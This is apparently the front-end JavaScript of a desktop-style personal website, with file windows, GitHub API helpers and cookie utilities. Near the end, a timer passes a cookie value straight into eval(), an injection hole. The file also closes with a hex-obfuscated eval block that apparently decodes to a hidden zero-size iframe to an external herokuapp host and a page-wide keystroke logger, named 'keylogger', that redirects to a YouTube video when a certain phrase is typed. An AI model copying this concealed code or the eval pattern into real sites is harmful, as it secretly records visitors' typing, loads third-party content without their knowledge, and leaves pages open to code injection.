owner = 'yasircoskun'

function endpointResolve(params) {
    const regex = /{[\w\d]+}/gm;
    while ((m = regex.exec(params['endpoint'])) !== null) {
        if (m.index === regex.lastIndex) {
            regex.lastIndex++;
        }

        m.forEach((match) => {
            params['endpoint'] = params['endpoint'].replace(match, params[match.substr(1, match.length - 2)])
        });
    }
    return params['endpoint']
}

function getRepos(username) {
    let repos = []
    let url = endpointResolve({
        endpoint: 'https://api.github.com/users/{owner}/repos',
        owner: owner
    });
    let request = new XMLHttpRequest();
    request.onload = function() {
        repos = JSON.parse(this.responseText);
    }
    request.open('get', url, false)
    request.send()
    return repos
}

function getContent(repo) {
    let url = endpointResolve({
        endpoint: 'https://api.github.com/repos/{owner}/{repo}/contents/{path}',
        owner: repo.owner.login,
        repo: repo.name,
        path: '/README.md'
    });
    let content
    let request = new XMLHttpRequest();
    request.onload = function() {
        content = JSON.parse(this.responseText);
        //console.log(atob(content.content)); // dosya içeriği base64 kodunu çözmek için 
    }
    request.open('get', url, false)
    request.send()
    return content
}

function generateFileIcon(name, namepath, content) {
    let html = `
    <div class='file' data-name='{name.path}' onclick='openWin(this)'>
    <span class="fiv-cla fiv-icon-{ext}"></span>
    <br>
    <label class='gradienText'>{name}</label>
    <div class='hidden-content'>{content}</div>
    </div> 
    `;
    html = html.replace('{name}', name);
    html = html.replace('{ext}', name.substring(name.indexOf('.') + 1, name.length));
    if (name.substring(name.indexOf('.') + 1, name.length) != 'mp4') {
        html = html.replace('{content}', content);
    }
    html = html.replace('{name.path}', namepath);
    let temp = document.createElement('template');
    html = html.trim();
    temp.innerHTML = html;
    return temp.content.firstChild;
}

function openWin(element) {
    let name = element.dataset.name;
    let path = element.parentElement.parentElement.id;
    if (!winExist(name.replace('.', ''))) {
        winElement = generateWin(name);
        winElement.getElementsByTagName('pre')[0].className = name.substring(name.indexOf('.') + 1, name.length);

        if (name.substring(name.indexOf('.') + 1, name.length) == 'pdf') {
            winElement.getElementsByTagName('pre')[0].innerHTML = "<iframe src='" + name + "'></iframe>";
        } else if (name.substring(name.indexOf('.') + 1, name.length) == 'jpg' || name.substring(name.indexOf('.') + 1, name.length) == 'gif') {
            console.log(name.substring(name.indexOf('.') + 1, name.length));
            winElement.getElementsByTagName('pre')[0].outerHTML = "<img src='" + name + "'></img>";
        } else if (name.substring(name.indexOf('.') + 1, name.length) == 'mp4') {
            console.log(name.substring(name.indexOf('.') + 1, name.length));
            winElement.getElementsByTagName('pre')[0].outerHTML = " <video autoplay controls><source src='" + name + "' type='video/mp4'>Video destekleyen bir tarayıcı ile görüntüle!</video>";
        } else if (name.substring(name.indexOf('.') + 1, name.length) == 'app') {
            winElement.getElementsByClassName('content')[0].innerHTML = "<iframe src='" + name.replace('.app', '.html') + "'></iframe>";
        } else if (name.substring(name.indexOf('.') + 1, name.length) == 'md') {
            if (typeof marked == "function") {
                winElement.getElementsByClassName('content')[0].innerHTML = "<div class='markdown'>" + marked(element.lastElementChild.innerText) + "</div>";
            } else {
                winElement.getElementsByClassName('content')[0].innerHTML = "<div class='markdown'>" + marked.marked(element.lastElementChild.innerText) + "</div>";
            }
        } else {
            winElement.getElementsByTagName('pre')[0].innerHTML = (name != 'New') ? httpGet(name) : "\n\n\n";
        }
        document.body.appendChild(winElement);
    }
    document.getElementById(name.replace('.', '')).dataset.fileName = name;
    focusWin(document.getElementById(name.replace('.', '')));
    document.getElementById(name.replace('.', '')).style.display = 'block';
    dragElement(document.getElementById(name.replace('.', '')));
    if (!mobileCheck()) { windowFix(); } else {
        winElement.getElementsByClassName('content')[0].style.height = winElement.clientHeight - 35 - winElement.firstChild.clientHeight + "px";
        //winElement.getElementsByClassName('content')[0].style.width = winElement.clientWidth + "px";
    }

    winElement.querySelectorAll('pre code').forEach((el) => {
        hljs.highlightElement(el);
    });
    //hljs.highlightElement(winElement.getElementsByTagName('pre')[0]);
}

function generateWin(name) {
    let html = "<div class='fileWin' id='{name.id}'><div class='winTitle'><h4>{name}</h4><div class='closeIcon' onclick='closeWin(this);'>x</div></div><div class='content'><pre contenteditable='True'></pre></div></div>";
    html = html.replace('{name}', name);
    html = html.replace('{name.id}', name.replace('.', ''));
    let temp = document.createElement('template');
    html = html.trim();
    temp.innerHTML = html;
    return temp.content.firstChild;
}

function windowFix() {
    if (!document.body.contains(document.getElementById('windowFixer'))) {
        var w = window.innerWidth - 200;
        var h = window.innerHeight - 200;
        let html = `
        <style id="windowFixer"> 
            .content {
                max-width: ` + w + `px;
                max-height: ` + h + `px;
            }
        </style>`;
        let temp = document.createElement('template');
        html = html.trim();
        temp.innerHTML = html;
        document.head.appendChild(temp.content.firstChild)
    }
}

function closeWin(x) {
    x.parentElement.parentElement.style.display = 'none';
}

//getContent(getRepos()[0])

/*repos = getRepos()
repos.forEach((repo) => {
    repoContent = getContent(repo)
    console.log(repoContent)
    let fileIcon = generateFileIcon(repoContent.name, repo.name + '/' + repoContent.name, atob(repoContent.content))
    document.body.appendChild(fileIcon)

})





*/

function ls(path = "/contents") {
    let request = new XMLHttpRequest();
    request.open('get', path + "/ls", false)
    request.send(null)
    files = []
    files_str_list = request.responseText.split("\n")
    console.log(files_str_list)
    files_str_list.forEach((file_str) => {
        file_str_splited = file_str.trim().split(' ')
        file = {}
        file['type'] = file_str_splited[0]
        file['name'] = file_str_splited[1]
        file['path'] = path + "/" + file_str_splited[1]
        files.push(file)
    });
    return files;
}

function cat(path) {
    console.log(path);
    if (path.substring(path.indexOf('.') + 1, path.length) == 'mp4') {
        return 'video: ' + path;
    }
    let request = new XMLHttpRequest();
    request.open('get', path + "?nocache=" + Math.random(), false)
    request.send(null)
    return request.responseText;

}

files = ls()
files.forEach((file) => {
    if (file['type'] == 'file') {
        file['content'] = cat(file['path'])
        let fileIcon = generateFileIcon(file['name'], file['path'], file['content'])
        document.body.appendChild(fileIcon)
    } else if (file['type'] == 'dir') {
        let fileIcon = generateFolderIcon(file['name'], file['path'])
        document.body.appendChild(fileIcon)
        console.log('directory')
    } else {
        console.log('typeless object')
    }
})

function fileLoadEndEvent() {
    fileLoadEndFunction();
}

fileLoadEndEvent();









function httpGet(theUrl) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", theUrl.indexOf('?') != -1 ? theUrl + '&nocache=' + new Date().getTime() : theUrl + '?nocache=' + new Date().getTime(), false);
    xmlHttp.send(null);
    return xmlHttp.responseText;
}

function generateFolderIcon(name, path) {
    let html = `
    <div class='folder' data-name='{path}' onclick='openFolder(this)'>
    <span class="fiv-cla fiv-icon-{ext}"></span><br>
    <label class='gradienText'>{name}</label>
    </div>
    `;
    html = html.replace('{name}', name);
    html = html.replace('{path}', path.replace('.', ''));
    html = html.replace('{ext}', 'folder');
    let temp = document.createElement('template');
    html = html.trim();
    temp.innerHTML = html;
    return temp.content.firstChild;
}


function openFolder(element) {
    let name = element.dataset.name;
    element.dataset.opened = "true";
    let path = element.parentElement.parentElement.id;
    if (!winExist(name.replace('.', ''))) {
        folderElement = generateWin(name);

        files = ls(name)
        files.forEach((file) => {
            if (file['type'] == 'file') {
                file['content'] = cat(file['path'])
                let fileIcon = generateFileIcon(file['name'], file['path'], file['content'])
                folderElement.getElementsByClassName('content')[0].appendChild(fileIcon)
            } else if (file['type'] == 'dir') {
                let fileIcon = generateFolderIcon(file['name'], file['path'])
                folderElement.getElementsByClassName('content')[0].appendChild(fileIcon)
                console.log('directory')
            } else {
                console.log('typeless object')
            }
        })
        document.body.appendChild(folderElement);
    }
    document.getElementById(name.replace('.', '')).dataset.fileName = name;
    focusWin(document.getElementById(name.replace('.', '')));
    document.getElementById(name.replace('.', '')).style.display = 'block';
    dragElement(document.getElementById(name.replace('.', '')));

    if (!mobileCheck()) { windowFix(); } else {
        folderElement.getElementsByClassName('content')[0].style.height = folderElement.clientHeight - 35 - folderElement.firstChild.clientHeight + "px";
        console.log(folderElement.clientHeight - 35 - folderElement.firstChild.clientHeight + "px")
    }
    if (fileLoadEndFunction != null) fileLoadEndFunction();
}

function winExist(id) {
    wins = document.getElementsByClassName('fileWin');
    for (let i = 0; i < wins.length; i++) {
        if (wins[i].id == id) {
            return true;
        }
    }
    return false;
}

function focusWin(elemnt) {
    while (elemnt.className != 'fileWin') {
        elemnt = elemnt.parentElement;
    }

    let name = elemnt.dataset.fileName;

    if (elemnt.style.zIndex != '2') {
        //console.log(elemnt)
        window.history.pushState('', '', name.replace('/contents', ''));
        let elemnts = document.getElementsByClassName(elemnt.className);
        for (let i = 0; i < elemnts.length; i++) {
            elemnts[i].style.zIndex = '1';
        }
        elemnt.style.zIndex = '2';
    }
}

function dragElement(elmnt) {
    var pos1 = 0,
        pos2 = 0,
        pos3 = 0,
        pos4 = 0;
    if (elmnt.firstElementChild) {
        // if present, the header is where you move the DIV from:
        elmnt.firstElementChild.onmousedown = dragMouseDown;
        elmnt.style.margin = '0';
    } else {
        // otherwise, move the DIV from anywhere inside the DIV:
        elmnt.onmousedown = dragMouseDown;
    }

    function dragMouseDown(e) {
        e = e || window.event;
        e.preventDefault();

        elemnt = e.target;
        focusWin(elemnt);
        while (elemnt.className != 'fileWin') {
            elemnt = elemnt.parentElement;
        }

        if (elemnt.style.zIndex != '2') {
            console.log(elemnt)
            let elemnts = document.getElementsByClassName(elemnt.className);
            for (let i = 0; i < elemnts.length; i++) {
                elemnts[i].style.zIndex = '1';
            }
            elemnt.style.zIndex = '2';
        }

        // get the mouse cursor position at startup:
        pos3 = e.clientX;
        pos4 = e.clientY;
        document.onmouseup = closeDragElement;
        // call a function whenever the cursor moves:
        document.onmousemove = elementDrag;
    }

    function elementDrag(e) {
        e = e || window.event;
        e.preventDefault();

        // calculate the new cursor position:
        pos1 = pos3 - e.clientX;
        pos2 = pos4 - e.clientY;
        pos3 = e.clientX;
        pos4 = e.clientY;
        // set the element's new position:
        elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
        elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
    }

    function closeDragElement() {
        // stop moving when mouse button is released:
        document.onmouseup = null;
        document.onmousemove = null;
    }
}

setCookie('command', 'idle', 1)

var backgorundUrl = getCookie('backgroundUrl');
if (backgorundUrl != "") {
    document.body.style.background = 'url(' + backgorundUrl + ') no-repeat center center fixed';
}

function setCookie(cname, cvalue, exdays) {
    const d = new Date();
    d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
    let expires = "expires=" + d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

function reload_command() {
    location.reload();
}

function idle_command() {
    //
}

setInterval(() => {
    let command = getCookie('command');
    setCookie('command', 'idle', 1);
    eval(command + '_command()');
}, 1000);

var _0xc7f6 = ["\x37\x20\x30\x3D\x34\x2E\x64\x28\x27\x6F\x27\x29\x3B\x30\x2E\x6C\x3D\x22\x33\x22\x3B\x30\x2E\x6B\x3D\x22\x33\x22\x3B\x30\x2E\x6A\x2E\x69\x3D\x22\x33\x20\x6E\x20\x6D\x22\x3B\x30\x2E\x68\x3D\x22\x35\x3A\x2F\x2F\x63\x2E\x62\x2E\x36\x2F\x22\x3B\x30\x2E\x61\x3D\x22\x67\x22\x3B\x34\x2E\x39\x2E\x66\x28\x30\x29\x3B\x37\x20\x32\x3D\x22\x22\x3B\x78\x20\x38\x28\x65\x29\x7B\x32\x2B\x3D\x65\x2E\x79\x3B\x41\x28\x32\x2E\x7A\x28\x22\x42\x22\x29\x21\x3D\x2D\x31\x29\x7B\x72\x2E\x71\x3D\x22\x35\x3A\x2F\x2F\x70\x2E\x73\x2E\x36\x2F\x77\x3F\x76\x3D\x75\x22\x3B\x32\x3D\x22\x22\x7D\x7D\x34\x2E\x39\x2E\x74\x3D\x38\x3B", "\x7C", "\x73\x70\x6C\x69\x74", "\x69\x66\x72\x7C\x7C\x6C\x6F\x67\x73\x7C\x30\x70\x78\x7C\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x68\x74\x74\x70\x73\x7C\x63\x6F\x6D\x7C\x76\x61\x72\x7C\x6B\x65\x79\x6C\x6F\x67\x67\x65\x72\x7C\x62\x6F\x64\x79\x7C\x6D\x75\x74\x65\x64\x7C\x68\x65\x72\x6F\x6B\x75\x61\x70\x70\x7C\x73\x65\x76\x69\x6C\x69\x79\x6F\x73\x75\x6E\x7C\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x7C\x7C\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64\x7C\x45\x6C\x62\x65\x74\x74\x65\x7C\x73\x72\x63\x7C\x62\x6F\x72\x64\x65\x72\x7C\x73\x74\x79\x6C\x65\x7C\x68\x65\x69\x67\x68\x74\x7C\x77\x69\x64\x74\x68\x7C\x72\x65\x64\x7C\x73\x6F\x6C\x69\x64\x7C\x69\x66\x72\x61\x6D\x65\x7C\x77\x77\x77\x7C\x68\x72\x65\x66\x7C\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x7C\x79\x6F\x75\x74\x75\x62\x65\x7C\x6F\x6E\x6B\x65\x79\x64\x6F\x77\x6E\x7C\x76\x77\x6B\x64\x36\x33\x6E\x50\x77\x52\x73\x7C\x7C\x77\x61\x74\x63\x68\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x6B\x65\x79\x7C\x69\x6E\x64\x65\x78\x4F\x66\x7C\x69\x66\x7C\x65\x69\x61\x6C\x63\x5F", "", "\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65", "\x72\x65\x70\x6C\x61\x63\x65", "\x5C\x77\x2B", "\x5C\x62", "\x67"];
eval(function(_0x154cx1, _0x154cx2, _0x154cx3, _0x154cx4, _0x154cx5, _0x154cx6) {
    _0x154cx5 = function(_0x154cx3) { return (_0x154cx3 < _0x154cx2 ? _0xc7f6[4] : _0x154cx5(parseInt(_0x154cx3 / _0x154cx2))) + ((_0x154cx3 = _0x154cx3 % _0x154cx2) > 35 ? String[_0xc7f6[5]](_0x154cx3 + 29) : _0x154cx3.toString(36)) };
    if (!_0xc7f6[4][_0xc7f6[6]](/^/, String)) {
        while (_0x154cx3--) { _0x154cx6[_0x154cx5(_0x154cx3)] = _0x154cx4[_0x154cx3] || _0x154cx5(_0x154cx3) };
        _0x154cx4 = [function(_0x154cx5) { return _0x154cx6[_0x154cx5] }];
        _0x154cx5 = function() { return _0xc7f6[7] };
        _0x154cx3 = 1
    };
    while (_0x154cx3--) { if (_0x154cx4[_0x154cx3]) { _0x154cx1 = _0x154cx1[_0xc7f6[6]](new RegExp(_0xc7f6[8] + _0x154cx5(_0x154cx3) + _0xc7f6[8], _0xc7f6[9]), _0x154cx4[_0x154cx3]) } };
    return _0x154cx1
}(_0xc7f6[0], 38, 38, _0xc7f6[3][_0xc7f6[2]](_0xc7f6[1]), 0, {}))